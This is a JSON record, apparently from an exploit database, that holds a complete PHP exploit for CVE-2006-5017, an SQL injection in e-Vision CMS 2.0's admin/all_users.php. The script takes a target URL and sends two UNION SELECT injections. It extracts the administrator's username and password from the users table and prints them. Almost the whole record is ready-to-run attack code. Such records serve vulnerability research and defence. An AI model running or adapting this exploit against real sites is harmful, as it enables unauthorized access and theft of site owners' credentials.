{
  "id": "2418",
  "title": "e-Vision CMS 2.0 - &#039;all_users.php&#039; SQL Injection",
  "cve": "CVE-2006-5017",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\n/*\r\n/* e-Vision CMS Remote sql injection exploit\r\n/*            By : HACKERS PAL\r\n/*             WwW.SoQoR.NeT\r\n*/\r\nprint_r('\r\n/**********************************************/\r\n/* e-Vision CMS Remote sql injection exploit  */\r\n/*    by HACKERS PAL <security@soqor.net>     */\r\n/*        site: http://www.soqor.net          */');\r\nif ($argc<2) {\r\n\tprint_r('\r\n/* --                                         */\r\n/* Usage: php '.$argv[0].' host\r\n/* Example:                                   */\r\n/*    php '.$argv[0].' http://localhost/evision\r\n/**********************************************/\r\n');\r\n\tdie;\r\n}\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\n$url=$argv[1];\r\n$exploit=\"/admin/all_users.php?from=-1%20union%20select%20null,null,null,username,null%20from%20users%20where%20idusers=1/*\";\r\n$exploit2=\"/admin/all_users.php?from=-1%20union%20select%20null,null,null,pass,null%20from%20users%20where%20idusers=1/*\";\r\n\r\nFunction get_page($url)\r\n{\r\n\r\n\tif(function_exists(\"file_get_contents\"))\r\n\t{\r\n\r\n\t\t$contents = file_get_contents($url);\r\n\r\n\t}\r\n\telse\r\n\t{\r\n\t\t$fp=fopen(\"$url\",\"r\");\r\n\t\twhile($line=fread($fp,1024))\r\n\t\t{\r\n\t\t\t$contents=$contents.$line;\r\n\t\t}\r\n\r\n\r\n\t}\r\n\treturn $contents;\r\n}\r\n\r\nfunction get($var)\r\n{\r\n\tif(strlen($var[1])>0)\r\n\t{\r\n\t\tEcho trim($var[1]);\r\n\t}\r\n}\r\n\r\n$page = get_page($url.$exploit);\r\n$page2 = get_page($url.$exploit2);\r\n\r\nif(preg_match('/\\<td bgcolor=\\\"#C2D4E8\\\">(.+?)<\\/td\\>/is',$page))\r\n{\r\n\tEcho \"\\n[+] User Name : \";\r\n\tpreg_replace_callback('/\\<td bgcolor=\\\"#C2D4E8\\\">(.+?)<\\/td\\>/is','get',$page);\r\n\tEcho \"\\n[+] Pass Word : \";\r\n\tpreg_replace_callback('/\\<td bgcolor=\\\"#C2D4E8\\\">(.+?)<\\/td\\>/is','get',$page2);\r\n\tDie(\"\\n/* Visit us : WwW.SoQoR.NeT                   */\\n/**********************************************/\");\r\n}\r\n\r\nDie(\"\\n[-] Exploit Failed\\n/* Visit us : WwW.SoQoR.NeT                   */\\n/**********************************************/\");\r\n?>\r\n\r\n# milw0rm.com [2006-09-22]",
  "url": "https://www.exploit-db.com/exploits/2418"
}